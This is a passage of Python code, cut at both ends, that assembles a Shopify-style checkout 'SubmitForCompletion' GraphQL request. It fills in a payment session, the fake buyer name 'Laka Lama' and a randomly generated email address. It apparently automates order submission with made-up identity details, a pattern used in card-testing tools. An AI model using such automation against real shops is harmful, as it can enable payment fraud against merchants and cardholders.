                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{price}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {
                        'memberships': [],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [
                            {
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': sessionid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': addr["address1"],
                                                'city': addr["city"],
                                                'countryCode': addr["countryCode"],
                                                'postalCode': addr["postalCode"],
                                                'firstName': 'Laka',
                                                'lastName': 'Lama',
                                                'zoneCode': addr["zoneCode"],
                                                'phone': addr["phone"],
                                            },
                                        },
                                        'cardSource': None,
                                    },
                                    'giftCardPaymentMethod': None,
                                    'redeemablePaymentMethod': None,
                                    'walletPaymentMethod': None,
                                    'walletsPlatformPaymentMethod': None,
                                    'localPaymentMethod': None,
                                    'paymentOnDeliveryMethod': None,
                                    'paymentOnDeliveryMethod2': None,
                                    'manualPaymentMethod': None,
                                    'customPaymentMethod': None,
                                    'offsitePaymentMethod': None,
                                    'customOnsitePaymentMethod': None,
                                    'deferredPaymentMethod': None,
                                    'customerCreditCardPaymentMethod': None,
                                    'paypalBillingAgreementPaymentMethod': None,
                                },
                                'amount': {
                                    'value': {
                                        'amount': f'{total}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': addr["address1"],
                                'city': addr["city"],
                                'countryCode': addr["countryCode"],
                                'postalCode': addr["postalCode"],
                                'firstName': 'Laka',
                                'lastName': 'Lama',
                                'zoneCode': addr["zoneCode"],
                                'phone': addr["phone"],
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': f'{addr["currencyCode"]}',
                            'countryCode': f'{countryCode}',
                        },
                        'email': f"gmail{__import__('random').randint(100000,999999)}@gmail.com",
                        'emailChanged': False,
                        'phoneCountryCode': f'{countryCode}',
                        'marketingConsent': [],
                        'shopPayOptInPhone': {
                            'countryCode': f'{countryCode}',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f'{tax3}',
                                'currencyCode': f'{addr["currencyCode"]}',
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                    'captcha': None,
                    'cartMetafields': [],
                },
                'attemptToken': f'{token}-4j33p1vmcd5',
                'metafields': [],
                'analytics': {
                    'requestUrl': checkout_url,
                    'pageId': '0cde623b-7B13-4911-E150-61A3736179ED',
                },
            },
            'operationName': 'SubmitForCompletion',
        }

        sjson_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code 